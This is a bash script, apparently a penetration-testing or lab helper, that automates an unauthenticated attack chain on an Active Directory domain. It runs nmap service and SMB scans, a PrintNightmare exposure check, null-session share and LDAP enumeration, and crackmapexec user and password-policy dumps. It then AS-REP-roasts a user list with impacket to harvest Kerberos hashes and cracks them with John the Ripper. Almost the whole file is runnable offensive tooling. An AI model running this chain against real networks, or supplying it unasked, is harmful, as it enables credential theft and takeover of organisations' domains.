#!/bin/bash
############################################################
# Help                                                     #
############################################################
Help()
{
	# Display Help
	echo "Edit $0 to adjust for your environment."
	echo "Usage: sh $0"
	echo
	echo "options:"
	echo "-h     Print this Help."
	echo
}

############################################################
# Main program                                             #
############################################################
# Set variables
############################################################

# Colors
RED="31"
GREEN="32"
BOLDGREEN="\e[1;${GREEN}m"
ITALICRED="\e[3;${RED}m"
ENDCOLOR="\e[0m"

# Active Directory Environment
AD_IP="172.26.16.117"
Domain="dark.local"
Domain_Name="dc=dark,dc=local"

# Cracking
Users_File='users_test.txt'
Dict_JTR='/usr/share/john/password.lst'

############################################################
# Process the input options. Add options as needed.        #
############################################################
# Get the options
while getopts ":h:" option; do
	case $option in
		h) # display Help
			Help
			exit;;
		\?) # Invalid option
			echo "Error: Invalid option"
			exit;;
	esac
done

if [ -z "$AD_IP" ] || [ -z "$Domain" ]
then
	Help
	exit
fi

echo "${BOLDGREEN}Attacking the Domain: $AD_IP $Domain.${ENDCOLOR}"
echo "${BOLDGREEN}ENUMERATION WITHOUT CREDENTIALS.${ENDCOLOR}"

echo 
echo "${BOLDGREEN}Port Scan...${ENDCOLOR}"
echo "${ITALICRED}nmap -p53,88,135,139,389,445,464,636,3268,3269,5985 -sV --open $AD_IP.${ENDCOLOR}"
echo
nmap -p53,88,135,139,389,445,464,636,3268,3269,5985 -sV --open $AD_IP

echo 
echo "${BOLDGREEN}Nmap SMB Protocols...${ENDCOLOR}"
echo "${ITALICRED}nmap --script smb-protocols -p445  $AD_IP.${ENDCOLOR}"
echo
nmap --script smb-protocols -p445  $AD_IP

echo
echo "${BOLDGREEN}PrintNightMare Verify.${ENDCOLOR}"
echo "${ITALICRED}impacket-rpcdump @$AD_IP | egrep 'MS-RPRN|MS-PAR'.${ENDCOLOR}"
echo
impacket-rpcdump @$AD_IP | egrep 'MS-RPRN|MS-PAR'

echo
echo "${BOLDGREEN}Windows shares - smbclient -U ''.${ENDCOLOR}"
echo "${ITALICRED}echo | smbclient -L \\\\$AD_IP -U ''.${ENDCOLOR}"
echo
echo | smbclient -L \\\\$AD_IP -U ''

echo
echo "${BOLDGREEN}Windows shares - nmap smb-enum-sesions.${ENDCOLOR}"
echo "${ITALICRED}nmap --script smb-enum-sessions -p445 $AD_IP.${ENDCOLOR}"
echo
nmap --script smb-enum-sessions -p445 $AD_IP

echo
echo "${BOLDGREEN}Ldapsearch...${ENDCOLOR}"
echo "${ITALICRED}ldapsearch -x -H ldap://$AD_IP -b '$Domain_Name'.${ENDCOLOR}"
echo
ldapsearch -x -H ldap://$AD_IP -b "$Domain_Name"

echo
echo "${BOLDGREEN}CME without creds.${ENDCOLOR}"
echo "${ITALICRED}crackmapexec smb $AD_IP --pass-pol --users --sessions --disks --loggedon-users --groups --computers --local-groups.${ENDCOLOR}"
echo
crackmapexec smb $AD_IP --pass-pol --users --sessions --disks --loggedon-users --groups --computers --local-groups


echo
echo "${BOLDGREEN}Impacket-GetNPUsers - AS-REPRousting.${ENDCOLOR}"
echo "${ITALICRED}impacket-GetNPUsers -no-pass -usersfile $Users_File -dc-ip $AD_IP $Domain/.${ENDCOLOR}"
echo
Hashes_ASREP='Hashes_'$Domain'_ASREP.txt'
rm -rf $Hashes_ASREP
impacket-GetNPUsers -no-pass -usersfile $Users_File -dc-ip $AD_IP $Domain/ | grep "krb5" >> $Hashes_ASREP
echo $(wc -l $Hashes_ASREP) " Hashes Found..."
cat $Hashes_ASREP

echo
echo "${BOLDGREEN}Password Cracking With John The Ripper Using Passwords.lst Dictionary.${ENDCOLOR}"
echo "${ITALICRED}john $Hashes_ASREP --wordlist=$Dict_JTR.${ENDCOLOR}"
echo
john $Hashes_ASREP --wordlist=$Dict_JTR
